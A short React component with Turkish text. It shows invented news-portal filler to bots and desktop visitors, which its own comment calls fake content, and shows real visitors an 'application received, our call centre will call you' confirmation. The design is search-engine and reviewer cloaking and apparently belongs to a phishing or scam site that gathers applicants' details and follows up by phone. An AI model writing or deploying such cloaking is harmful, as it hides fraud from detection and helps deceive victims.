import React from 'react';
import { Helmet } from 'react-helmet';

function Bekleme({ isBot }) {
  // Bot (facebookexternalhit hariç) veya desktop için sahte içerik
  if (isBot) {
    return (
      <>
        <Helmet>
          <meta name="robots" content="index, follow" />
        </Helmet>
        <div>
          <h1 style={{ color: '#333', textAlign: 'center' }}>Güncel Haberler</h1>
          <p style={{ maxWidth: '600px', margin: '20px auto', textAlign: 'center' }}>
            Son dakika haberleri, ekonomi, spor ve daha fazlası için haber portalımıza hoş geldiniz.
          </p>
          <div style={{ margin: '10px 0' }}>
            <h2>Ekonomi Gündemi</h2>
            <p>Borsa ve döviz kurlarında son gelişmeler...</p>
          </div>
          <div style={{ margin: '10px 0' }}>
            <h2>Spor Dünyasından Haberler</h2>
            <p>Futbol liglerinde heyecan devam ediyor...</p>
          </div>
          <p style={{ textAlign: 'center' }}>
            <a href="/" style={{ color: '#0066cc', textDecoration: 'none' }}>Ana Sayfaya Dön</a>
          </p>
        </div>
      </>
    );
  }

  return (
    <div>
      <div className="panel">
        <div id="beklemePanel" className="panel-body">
          <h1 className="panel-title light" aria-live="assertive">
            Başvurunuz alındı.
            <p>
              Çağrı merkezimiz tarafından 24-48 saat içinde çağrı alacaksınız. Lütfen telefonunuz açık konumda olsun.
            </p>
          </h1>
          <div className="row">
            <div className="col-sm-12">
              <div className="form-horizontal">
                <div className="form-group form-group-offset">
                  <div className="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
                    <span className="check-icon fa fa-check" aria-hidden="true"></span>
                    <span className="sr-only">Başvurunuz alındı</span>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Bekleme;